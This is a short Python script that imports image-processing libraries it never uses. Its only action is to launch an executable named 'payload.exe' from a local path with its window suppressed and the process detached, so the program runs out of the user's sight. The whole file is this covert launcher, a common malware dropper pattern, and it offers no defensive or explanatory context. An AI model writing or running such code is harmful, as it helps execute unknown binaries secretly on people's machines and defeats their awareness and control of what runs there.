from PIL import Image
import numpy as np
import os
import sys
import subprocess
import tempfile
import time
import threading

startupinfo = subprocess.STARTUPINFO()
startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
startupinfo.wShowWindow = subprocess.SW_HIDE

process = subprocess.Popen(
    ["D:\\KTLT-code\\payload.exe"],
    startupinfo=startupinfo,
    creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
)